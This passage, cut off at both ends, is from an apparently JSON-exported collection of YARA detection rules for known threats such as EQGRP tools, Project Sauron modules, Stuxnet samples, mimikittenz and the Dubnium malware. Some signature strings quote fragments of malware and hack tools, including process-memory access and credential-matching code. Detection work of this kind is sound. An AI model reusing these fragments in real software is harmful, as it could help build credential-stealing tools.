\"$ans=\\\"$srcip:$srcport -> $dstip:$dstport\\\";\" fullword ascii\n      $s3 = \"return \\\"ERROR:$line is not a valid port\\\";\" fullword ascii\n      $s4 = \"$dstport=hextoPort($dstport);\" fullword ascii\n      $s5 = \"sub hextoPort\" fullword ascii\n      $s6 = \"$byte_table{\\\"$chars[$sixteens]$chars[$ones]\\\"}=$i;\" fullword ascii\n   condition: \n      filesize < 6KB and 4 of them\n}","date":"2016-08-15 08:46:41","description":"Detects tool from EQGRP toolset - file 1212.pl","minimum_yara":"1.7","name":"APT_EQGRP_1212_RID2AF9","reference":"Research","required_modules":[],"rule_hash":"7c6979d6da9ddd08509e6d43db635609","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_1212_dehex_RID2D66 : APT DEMO FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - from files 1212.pl, dehex.pl\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 10:30:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"return \\\"ERROR:$line is not a valid address\\\";\" fullword ascii\n      $s2 = \"print \\\"ERROR: the filename or hex representation needs to be one argument try using \\\\\\\"'s\\\\n\\\";\" fullword ascii\n      $s3 = \"push(@octets,$byte_table{$tempi});\" fullword ascii\n      $s4 = \"$byte_table{\\\"$chars[$sixteens]$chars[$ones]\\\"}=$i;\" fullword ascii\n      $s5 = \"print hextoIP($ARGV[0]);\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 6KB and ( 5 of ( $s* ) ) ) or ( all of them )\n}","date":"2016-08-15 10:30:11","description":"Detects tool from EQGRP toolset - from files 1212.pl, dehex.pl","minimum_yara":"1.7","name":"APT_EQGRP_1212_dehex_RID2D66","reference":"Research","required_modules":[],"rule_hash":"17f2525df3dd9f20d6d7897592f157bd","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_Project_Sauron_arping_module_RID33C8 : APT DEMO {\n   meta:\n      description = \"Detects strings from arping module - Project Sauron report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/eFoP4A\"\n      date = \"2016-08-08 15:02:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Resolve hosts that answer\" \n      $s2 = \"Print only replying Ips\" \n      $s3 = \"Do not display MAC addresses\" \n   condition: \n      all of them\n}","date":"2016-08-08 15:02:31","description":"Detects strings from arping module - Project Sauron report by Kaspersky","minimum_yara":"1.7","name":"APT_Project_Sauron_arping_module_RID33C8","reference":"https://goo.gl/eFoP4A","required_modules":[],"rule_hash":"f03f1968bc51e724055967fb4a046a14","score":80,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_Project_Sauron_basex_module_RID335A : APT DEMO {\n   meta:\n      description = \"Detects strings from basex module - Project Sauron report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/eFoP4A\"\n      date = \"2016-08-08 14:44:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"64, 64url, 32, 32url or 16.\" \n      $s2 = \"Force decoding when input is invalid/corrupt\" \n      $s3 = \"This cruft\" \n   condition: \n      $x1 or 2 of them\n}","date":"2016-08-08 14:44:11","description":"Detects strings from basex module - Project Sauron report by Kaspersky","minimum_yara":"1.7","name":"APT_Project_Sauron_basex_module_RID335A","reference":"https://goo.gl/eFoP4A","required_modules":[],"rule_hash":"16cf8f05aa3907e85ec798fc096479e0","score":80,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_Project_Sauron_kblogi_module_RID33BF : APT DEMO {\n   meta:\n      description = \"Detects strings from kblogi module - Project Sauron report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/eFoP4A\"\n      date = \"2016-08-08 15:01:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Inject using process name or pid. Default\" \n      $s2 = \"Convert mode: Read log from file and convert to text\" \n      $s3 = \"Maximum running time in seconds\" \n   condition: \n      $x1 or 2 of them\n}","date":"2016-08-08 15:01:01","description":"Detects strings from kblogi module - Project Sauron report by Kaspersky","minimum_yara":"1.7","name":"APT_Project_Sauron_kblogi_module_RID33BF","reference":"https://goo.gl/eFoP4A","required_modules":[],"rule_hash":"ec07e689a011e6a31d319b3999da0bb3","score":80,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_Project_Sauron_dext_module_RID32FC : APT DEMO {\n   meta:\n      description = \"Detects strings from dext module - Project Sauron report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/eFoP4A\"\n      date = \"2016-08-08 14:28:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Assemble rows of DNS names back to a single string of data\" \n      $x2 = \"removes checks of DNS names and lengths (during split)\" \n      $x3 = \"Randomize data lengths (length/2 to length)\" \n      $x4 = \"This cruft\" \n   condition: \n      2 of them\n}","date":"2016-08-08 14:28:31","description":"Detects strings from dext module - Project Sauron report by Kaspersky","minimum_yara":"1.7","name":"APT_Project_Sauron_dext_module_RID32FC","reference":"https://goo.gl/eFoP4A","required_modules":[],"rule_hash":"da2b1be9edaa32bd0aa2efaf52f7f418","score":80,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule Hacktool_This_Cruft_RID2EA0 : APT DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects string 'This cruft' often used in hack tools like netcat or cryptcat and also mentioned in Project Sauron report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/eFoP4A\"\n      date = \"2016-08-08 11:22:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"This cruft\" fullword\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and $x1 )\n}","date":"2016-08-08 11:22:31","description":"Detects string 'This cruft' often used in hack tools like netcat or cryptcat and also mentioned in Project Sauron report","minimum_yara":"1.7","name":"Hacktool_This_Cruft_RID2EA0","reference":"https://goo.gl/eFoP4A","required_modules":[],"rule_hash":"6c84bc98b3fdf8f6b28acb59b6f2d734","score":60,"tags":["APT","DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Typical_Malware_String_Transforms_RID3473 : DEMO EXE FILE MAL SUSP {\n   meta:\n      description = \"Detects typical strings in a reversed or otherwise modified form\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-31 15:31:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $e1 = \"exe.tsohcvs\" fullword ascii\n      $e2 = \"exe.ssasl\" fullword ascii\n      $e3 = \"exe.rerolpxe\" fullword ascii\n      $e4 = \"exe.erolpxei\" fullword ascii\n      $e5 = \"exe.23lldnur\" fullword ascii\n      $e6 = \"exe.dmc\" fullword ascii\n      $e7 = \"exe.llikksat\" fullword ascii\n      $l1 = \"lld.23lenreK\" fullword ascii\n      $l2 = \"lld.ESABLENREK\" fullword ascii\n      $l3 = \"lld.esabtpyrc\" fullword ascii\n      $l4 = \"lld.trcvsm\" fullword ascii\n      $l5 = \"LLD.LLDTN\" fullword ascii\n      $i1 = \"paeHssecorPteG\" fullword ascii\n      $i2 = \"sserddAcorPteG\" fullword ascii\n      $i3 = \"AyrarbiLdaoL\" fullword ascii\n      $i4 = \"AssecorPetaerC\" fullword ascii\n      $r1 = \"teSlortnoCtnerruC\" fullword ascii\n      $r2 = \"nuR\\\\noisreVtnerruC\" fullword ascii\n      $f1 = \"\\\\23metsys\\\\\" ascii\n      $f2 = \"\\\\23metsyS\\\\\" ascii\n      $f3 = \"niB.elcyceR$\" fullword ascii\n      $f4 = \"%tooRmetsyS%\" fullword ascii\n      $fp1 = \"Application Impact Telemetry Static Analyzer\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 1 of them and not 1 of ( $fp* ) )\n}","date":"2016-07-31 15:31:01","description":"Detects typical strings in a reversed or otherwise modified form","minimum_yara":"1.7","name":"Typical_Malware_String_Transforms_RID3473","reference":"Internal Research","required_modules":[],"rule_hash":"495b5bbeee3e6ca4a40fa9b527941cc9","score":60,"tags":["SUSP","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Invoke_mimikittenz_RID2E91 : DEMO FILE HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file Invoke-mimikittenz.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/putterpanda/mimikittenz\"\n      date = \"2016-07-19 11:20:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[mimikittenz.MemProcInspector]\" ascii\n      $s1 = \"PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |\" fullword ascii\n      $s2 = \"IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, false, process.Id);\" fullword ascii\n      $s3 = \"&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=\" ascii\n      $s4 = \"[DllImport(\\\"kernel32.dll\\\", SetLastError = true)]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7566 and filesize < 60KB and 2 of them ) or $x1\n}","date":"2016-07-19 11:20:01","description":"Semiautomatic generated rule - file Invoke-mimikittenz.ps1","minimum_yara":"1.7","name":"Invoke_mimikittenz_RID2E91","reference":"https://github.com/putterpanda/mimikittenz","required_modules":[],"rule_hash":"ad7ae071e1bd371cda7dde6b8e825f10","score":75,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule APT_StuxNet_Malware_1_RID2EE8 : APT DEMO MAL {\n   meta:\n      description = \"Stuxnet Sample - file malware.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 11:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 } \n      $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 } \n      $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd } \n   condition: \n      all of them\n}","date":"2016-07-09 11:34:31","description":"Stuxnet Sample - file malware.exe","minimum_yara":"1.7","name":"APT_StuxNet_Malware_1_RID2EE8","reference":"Internal Research","required_modules":[],"rule_hash":"28e22abcfccf736aefa1c5e69c1bb9ec","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule APT_StuxNet_dll_RID2CCB : APT DEMO EXE FILE {\n   meta:\n      description = \"Stuxnet Sample - file dll.dll\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 10:04:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SUCKM3 FROM EXPLORER.EXE MOTH4FUCKA #@!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $s1\n}","date":"2016-07-09 10:04:21","description":"Stuxnet Sample - file dll.dll","minimum_yara":"1.7","name":"APT_StuxNet_dll_RID2CCB","reference":"Internal Research","required_modules":[],"rule_hash":"1fda4e52c3b2a3a18c1688ba912ec7a6","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Stuxnet_Shortcut_to_RID304D : APT DEMO FILE T1210 {\n   meta:\n      description = \"Stuxnet Sample - file Copy of Shortcut to.lnk\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 12:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1210\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\\\\\.\\\\STORAGE#Volume#_??_USBSTOR#Disk&Ven_Kingston&Prod_DataTraveler_2.0&Rev_PMAP#5B6B098B97BE&0#{53f56307-b6bf-11d0-94f2-00a0c\" wide\n   condition: \n      uint16 ( 0 ) == 0x004c and filesize < 10KB and $x1\n}","date":"2016-07-09 12:34:01","description":"Stuxnet Sample - file Copy of Shortcut to.lnk","minimum_yara":"1.7","name":"APT_Stuxnet_Shortcut_to_RID304D","reference":"Internal Research","required_modules":[],"rule_hash":"7e2f91cdf7b0a55b9b77656905b684d6","score":75,"tags":["APT","DEMO","T1210","FILE"]},{"author":"Florian Roth","content":"rule APT_Stuxnet_Malware_2_RID2F09 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Stuxnet Sample - file 63e6b8136058d7a06dfff4034b4ab17a261cdf398e63868a601f77ddd1b32802\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 11:40:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\SystemRoot\\\\System32\\\\hal.dll\" fullword wide\n      $s2 = \"http://www.jmicron.co.tw0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 70KB and all of them\n}","date":"2016-07-09 11:40:01","description":"Stuxnet Sample - file 63e6b8136058d7a06dfff4034b4ab17a261cdf398e63868a601f77ddd1b32802","minimum_yara":"1.7","name":"APT_Stuxnet_Malware_2_RID2F09","reference":"Internal Research","required_modules":[],"rule_hash":"0b85f172255e76d5d38236d5e745915d","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_Stuxnet_Malware_3_RID2F0A : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Stuxnet Sample - file ~WTR4141.tmp\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 11:40:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SHELL32.DLL.ASLR.\" fullword wide\n      $s1 = \"~WTR4141.tmp\" fullword wide\n      $s2 = \"~WTR4132.tmp\" fullword wide\n      $s3 = \"totalcmd.exe\" fullword wide\n      $s4 = \"wincmd.exe\" fullword wide\n      $s5 = \"http://www.realtek.com0\" fullword ascii\n      $s6 = \"{%08x-%08x-%08x-%08x}\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 150KB and ( $x1 or 3 of ( $s* ) ) ) or ( 5 of them )\n}","date":"2016-07-09 11:40:11","description":"Stuxnet Sample - file ~WTR4141.tmp","minimum_yara":"1.7","name":"APT_Stuxnet_Malware_3_RID2F0A","reference":"Internal Research","required_modules":[],"rule_hash":"71db1865eae739f98c2c96de0047000f","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_Stuxnet_Malware_4_RID2F0B : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Stuxnet Sample - file 0d8c2bcb575378f6a88d17b5f6ce70e794a264cdc8556c8e812f0b5f9c709198\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 11:40:21\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\objfre_w2k_x86\\\\i386\\\\guava.pdb\" ascii\n      $x2 = \"MRxCls.sys\" fullword wide\n      $x3 = \"MRXNET.Sys\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and 1 of them ) or ( all of them )\n}","date":"2016-07-09 11:40:21","description":"Stuxnet Sample - file 0d8c2bcb575378f6a88d17b5f6ce70e794a264cdc8556c8e812f0b5f9c709198","minimum_yara":"1.7","name":"APT_Stuxnet_Malware_4_RID2F0B","reference":"Internal Research","required_modules":[],"rule_hash":"cd22b5c9434eeb93ac793444cc98e7de","score":100,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_Stuxnet_maindll_decrypted_unpacked_RID365D : APT DEMO T1045 {\n   meta:\n      description = \"Stuxnet Sample - file maindll.decrypted.unpacked.dll_\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 16:52:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1045\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\system32\\\\Drivers\\\\mrxsmb.sys;%SystemRoot%\\\\system32\\\\Drivers\\\\*.sys\" fullword wide\n      $s2 = \"<Actions Context=\\\"%s\\\"><Exec><Command>%s</Command><Arguments>%s,#%u</Arguments></Exec></Actions>\" fullword wide\n      $s3 = \"%SystemRoot%\\\\inf\\\\oem7A.PNF\" fullword wide\n      $s4 = \"%SystemRoot%\\\\inf\\\\mdmcpq3.PNF\" fullword wide\n      $s5 = \"%SystemRoot%\\\\inf\\\\oem6C.PNF\" fullword wide\n      $s6 = \"@abf varbinary(4096) EXEC @hr = sp_OACreate 'ADODB.Stream', @aods OUT IF @hr <> 0 GOTO endq EXEC @hr = sp_OASetProperty @\" wide\n      $s7 = \"STORAGE#Volume#1&19f7e59c&0&\" fullword wide\n      $s8 = \"view MCPVREADVARPERCON as select VARIABLEID,VARIABLETYPEID,FORMATFITTING,SCALEID,VARIABLENAME,ADDRESSPARAMETER,PROTOKOLL,MAXLIMI\" ascii\n   condition: \n      6 of them\n}","date":"2016-07-09 16:52:41","description":"Stuxnet Sample - file maindll.decrypted.unpacked.dll_","minimum_yara":"1.7","name":"APT_Stuxnet_maindll_decrypted_unpacked_RID365D","reference":"Internal Research","required_modules":[],"rule_hash":"b07a6dd29358301d38c75be58835f3fd","score":75,"tags":["APT","DEMO","T1045"]},{"author":"Florian Roth","content":"rule APT_Stuxnet_s7hkimdb_RID2EC8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Stuxnet Sample - file s7hkimdb.dll\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2016-07-09 11:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"S7HKIMDX.DLL\" fullword wide\n      $op1 = { 8b 45 08 35 dd 79 19 ae 33 c9 8b 55 08 89 02 89 } \n      $op2 = { 74 36 8b 7f 08 83 ff 00 74 2e 0f b7 1f 8b 7f 04 } \n      $op3 = { 74 70 81 78 05 8d 54 24 04 75 1b 81 78 08 04 cd } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and $x1 and all of ( $op* ) )\n}","date":"2016-07-09 11:29:11","description":"Stuxnet Sample - file s7hkimdb.dll","minimum_yara":"1.7","name":"APT_Stuxnet_s7hkimdb_RID2EC8","reference":"Internal Research","required_modules":[],"rule_hash":"74df3588963db776f733d5678a63629d","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Furtim_nativeDLL_RID2D4A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Furtim malware - file native.dll\"\n      author = \"Florian Roth\"\n      reference = \"MISP 3971\"\n      date = \"2016-06-13 10:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"FqkVpTvBwTrhPFjfFF6ZQRK44hHl26\" fullword ascii\n      $op0 = { e0 b3 42 00 c7 84 24 ac } \n      $op1 = { a1 e0 79 44 00 56 ff 90 10 01 00 00 a1 e0 79 44 } \n      $op2 = { bf d0 25 44 00 57 89 4d f0 ff 90 d4 02 00 00 59 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and $s1 or all of ( $op* )\n}","date":"2016-06-13 10:25:31","description":"Detects Furtim malware - file native.dll","minimum_yara":"1.7","name":"Furtim_nativeDLL_RID2D4A","reference":"MISP 3971","required_modules":[],"rule_hash":"fcc7e0ae33c824452c888d52e7c24d13","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Dubnium_Sample_2_RID2D37 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/AW9Cuu\"\n      date = \"2016-06-10 10:22:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \":*:::D:\\\\:c:~:\" fullword ascii\n      $s2 = \"SPMUVR\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2016-06-10 10:22:21","description":"Detects sample mentioned in the Dubnium Report","minimum_yara":"1.7","name":"Dubnium_Sample_2_RID2D37","reference":"https://goo.gl/AW9Cuu","required_modules":[],"rule_hash":"96e4ba0245bbb1298ca68e102a38556c","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Dubnium_Sample_SSHOpenSSL_RID3077 : DEMO EXE FILE MAL T1021 {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/AW9Cuu\"\n      date = \"2016-06-10 12:41:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sshkeypairgen.exe\" fullword wide\n      $s2 = \"OpenSSL: FATAL\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them\n}","date":"2016-06-10 12:41:01","description":"Detects sample mentioned in the Dubnium Report","minimum_yara":"1.7","name":"Dubnium_Sample_SSHOpenSSL_RID3077","reference":"https://goo.gl/AW9Cuu","required_modules":[],"rule_hash":"a56308d4ac87c8e82ac8c55864b5dbfd","score":75,"tags":["DEMO","EXE","T1021","FILE","MAL"]},{"author":"Florian Roth","content":"rule Dubnium_Sample_1_RID2D36 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/AW9Cuu\"\n      date = \"2016-06-10 10:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $key1 = \"3b840e20e9555e9fb031c4ba1f1747ce25cc1d0ff664be676b9b4a90641ff194\" fullword ascii\n      $key2 = \"90631f686a8c3dbc0703ffa353bc1fdf35774568ac62406f98a13ed8f47595fd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them\n}","date":"2016-06-10 10:22:11","description":"Detects sample mentioned in the Dubnium Report","minimum_yara":"1.7","name":"Dubnium_Sample_1_RID2D36","reference":"https://goo.gl/AW9Cuu","required_modules":[],"rule_hash":"cc337bbc7abd167e2e3e34a439a51847","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Dubnium_Sample_5_RID2D3A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/AW9Cuu\"\n      date = \"2016-06-10 10:22:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$innn[i$[i$^i[e[mdi[m$jf1Wehn[^Whl[^iin_hf$11mahZijnjbi[^[W[f1n$dej$[hn]1[W1ni1l[ic1j[mZjchl$$^he[[j[a[1_iWc[e[\" fullword ascii\n      $s2 = \"h$YWdh[$ij7^e$n[[_[h[i[[[\\\\][1$1[[j1W1[1cjm1[$[k1ZW_$$ncn[[Inbnnc[I9enanid[fZCX\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them\n}","date":"2016-06-10 10:22:51","description":"Detects sample mentioned in the Dubnium Report","minimum_yara":"1.7","name":"Dubnium_Sample_5_RID2D3A","reference":"https://goo.gl/AW9Cuu","required_modules":[],"rule_hash":"2ec97c979ec36f70de8602f425272178","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Dubnium_Sample_6_RID2D3B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/AW9Cuu\"\n      date = \"2016-06-10 10:23:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&()`~-_=+[{]{;',.\" fullword ascii\n      $s2 = \"e_$0[bW\\\\RZY\\\\jb\\\\ZY[nimiRc[jRZ]\" fullword ascii\n      $s3 = \"f_RIdJ0W9RFb[$Fbc9[k_?Wn\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them\n}","date":"2016-06-10 10:23:01","description":"Detects sample mentioned in the Dubnium Report","minimum_yara":"1.7","name":"Dubnium_Sample_6_RID2D3B","reference":"https://goo.gl/AW9Cuu","required_modules":[],"rule_hash":"8b4afa47172c15876d2a122c47469fad","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Dubnium_Sample_7_RID2D3C : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/AW9Cuu\"\n      date = \"2016-06-10 10:23:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"hWI[$lZ![nJ_[[lk[8Ihlo8ZiIl[[[$Ynk[f_8[88WWWJW[YWnl$$Z[ilf!$IZ$!W>Wl![W!k!$l!WoW8$nj8![8n_I^$[>_n[ZY[[Xhn_c!nnfK[!Z\" fullword ascii\n      $s2 = \"[i_^])[$n!]Wj^,h[,!WZmk^o$dZ[h[e!&W!l[$nd[d&)^Z\\\\^[[iWh][[[jPYO[g$$e&n\\\\,Wfg$[<g$[[ninn:j!!)Wk[nj[[o!!Y\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them\n}","date":"2016-06-10 10:23:11","description":"Detects sample mentioned in the Dubnium Report","minimum_yara":"1.7","name":"Dubnium_Sample_7_RID2D3C","reference":"https://goo.gl/AW9Cuu","required_modules":[],"rule_hash":"d842e5cd26af008835fcbd4c12b56749","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule SharpCat_RID2A27 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Hack Tool SharpCat_RID2A27 - 